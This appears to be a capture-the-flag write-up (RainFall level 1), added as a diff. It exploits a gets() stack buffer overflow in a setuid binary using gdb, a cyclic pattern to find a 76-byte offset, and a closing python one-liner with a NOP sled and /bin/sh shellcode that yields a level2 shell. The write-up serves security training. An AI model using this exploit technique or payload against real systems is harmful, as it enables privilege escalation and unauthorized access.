@@ -1,0 +1,158 @@
+LEVEL 1
+
+When logging as level0 in Rainfall we have a home with an executable called
+level1 :
+
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+
+We can execute it :
+
+level1@RainFall:~$ ./level1
+something
+
+It waits for an input from stdin and then nothing.
+
+We can try with different types of arguments :
+
+level1@RainFall:~$ ./level1
+something
+level1@RainFall:~$ ./level1
+123
+level1@RainFall:~$ ./level1
+!)@#(!@(#
+
+We can also gives an argument using a different syntax :
+
+level1@RainFall:~$ echo "hi" | ./level1
+level1@RainFall:~$ echo "12312312321" | ./level1
+
+level1@RainFall:~$ ./level1 < "hi"
+-bash: hi: No such file or directory
+level1@RainFall:~$ ./level1 < /bin/sh
+Segmentation fault (core dumped)
+level1@RainFall:~$ ./level1 < level1
+Segmentation fault (core dumped)
+
+Ok so we can crash the program with an executable.
+
+Let's open gdb to get more information on that level1:
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave
+   0x08048496 <+22>:	ret
+End of assembler dump.
+(gdb)
+
+There is a call to gets :
+
+(gdb) disas gets
+Dump of assembler code for function gets@plt:
+   0x08048340 <+0>:	jmp    *0x8049798
+   0x08048346 <+6>:	push   $0x0
+   0x0804834b <+11>:	jmp    0x8048330
+End of assembler dump.
+(gdb)
+
+From the man :
+
+"gets() reads a line from stdin into the buffer pointed to by s until either a 
+terminating newline or EOF, which it replaces with a null byte (aq\0aq). 
+No check for buffer overrun is performed"
+
+That's interesting, this is our lead to pass this level, we can use a buffer 
+overflow to exploit the executable.
+
+We need to get access to /home/user/level2/.pass remember ?
+
+When we've got a segmentation fault, it means that our buffer overflowed.
+But from where does it overflow ?
+
+Let's try to give level1 100 char :
+
+level1@RainFall:~$ ./level1
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5A
+c6Ac7Ac8Ac9Ad0Ad1Ad2A
+Segmentation fault (core dumped)
+
+Let's try that again with gdb :
+
+(gdb) break main
+Breakpoint 1 at 0x8048483
+(gdb) r
+Starting program: /home/user/level1/level1
+
+Breakpoint 1, 0x08048483 in main ()
+(gdb) c
+Continuing.
+Aa0Aa1Aa2iAa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
+Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+
+it crashed at : 0x63413563
+
+We need to now the value which made the executable overflow.
+It's possible to try it manually but there are tools online or metasploit to do
+that.
+
+Giving 0x63413563 we know the offset is exactly 76.
+
+63 41 35 63
+c  A  5  c
+
+Reversing the endianess : c5Ac and indeed in your input string :
+Aa0Aa1Aa2iAa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
+Ac | 6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Now that we know the exact offset to get our segfault.
+We need the eip address.
+
+To do that we call gdb again, with our offset and print the info frame :
+
+(gdb) break main
+Breakpoint 1 at 0x8048483
+(gdb) r
+Starting program: /home/user/level1/level1
+
+Breakpoint 1, 0x08048483 in main ()
+(gdb) c
+Continuing.
+Aa0Aa1Aa2iAa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
+Ac
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41356341 in ?? ()
+(gdb) info frame
+Stack level 0, frame at 0xbffff714:
+ eip = 0x41356341; saved eip 0x63
+ called by frame at 0xbffff718
+ Arglist at 0xbffff70c, args:
+ Locals at 0xbffff70c, Previous frame's sp is 0xbffff714
+ Saved registers:
+  eip at 0xbffff710
+
+To give level1 our shellcode address we need to overwrite the eip's one.
+To do that we need to go +4 bytes after our eip address at 
+
+eip + 4 = 0xbffff710 + 4 = 0xbffff714
+
+From here we can inject our shellcode.
+
+Shellcode we found here : https://www.exploit-db.com/exploits/13357
+It's specifically made to exploit gets.
+
+python -c 'print "\x41" * 76 + "\x14\xf7\xff\xbf" + "\x90" * 100 + "\x31\xc0
+\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27
+\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0
+\x0b\xcd\x80"' | ./level1 "/home/user/level2/.pass"
+
+Give us a new shell as level2.
